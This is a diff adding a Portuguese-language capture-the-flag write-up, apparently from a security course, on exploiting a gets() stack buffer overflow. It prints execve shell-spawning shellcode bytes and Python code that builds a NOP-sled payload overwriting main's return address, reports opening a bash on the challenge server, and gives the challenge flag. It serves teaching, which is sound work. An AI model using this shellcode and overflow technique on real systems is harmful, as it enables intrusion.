@@ -46,3 +46,40 @@ int main() {
     return 0;
 }
 ```
+
+A função `gets` é insegura pois copia para `buffer` todo o input de stdin até atingir um `\0`. Assim, uma vez que a stack tem permissões de execução e os seus endereços não estão randomizados, é possível fazer um buffer overflow para controlar o endereço de retorno da função main.
+
+Para construir o exploit usamos a linguagem Python e o mesmo shell code de CTFs anteriores que permitia lançar uma bash no terminal. Além disso, foi útil utilizar uma expressão regular para extrair o valor do endereço de buffer.
+
+```python
+ADDRESS_REGEX = "0x(.+).\n"
+SHELL_CODE = (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
+  "\x0b\xcd\x80" 
+).encode('latin-1')
+```
+
+O input terá exatamente 112 bytes:
+
+- Os primeiros 23 bytes contêm o shell code;
+- Os últimos 4 bytes contêm o endereço de retorno malicioso, que irá corresponder ao endereço do início do buffer;
+- Os restantes bytes intermédios terão NOP (*no operation*). 
+
+```python
+content = ctf_server.recvuntil(b'input:').decode()
+buffer_address = bytearray.fromhex(re.search(ADDRESS_REGEX, content).group(1))
+buffer_address.reverse()
+
+exploit = bytearray(NOP for _ in range(BUFFER_SIZE)) 
+exploit[: len(SHELL_CODE)] = SHELL_CODE
+exploit[BUFFER_SIZE - len(buffer_address):] = buffer_address
+```
+
+Isto irá reescrever o endereço de retorno da função main, que apontará agora para o shell code. Note-se que este processo também reescreve o frame pointer de main, que está na stack entre o endereço de retorno e o buffer. No entanto, como main não chega a retornar, a manutenção do valor original torna-se irrelevante.
+
+Tal como esperado, ao executar o código (disponível [aqui](../CTF/Exploits/ExploitCTF2S8.py)), conseguimos abrir uma bash no servidor:
+
+![CTF 4 2 b](../img/ctf4task2b.png)
+
+Conseguimos assim ter acesso ao conteúdo do ficheiro `flag.txt` e à flag do desafio, `flag{a4421b76e3dfc304875754a99497e1f1}`.
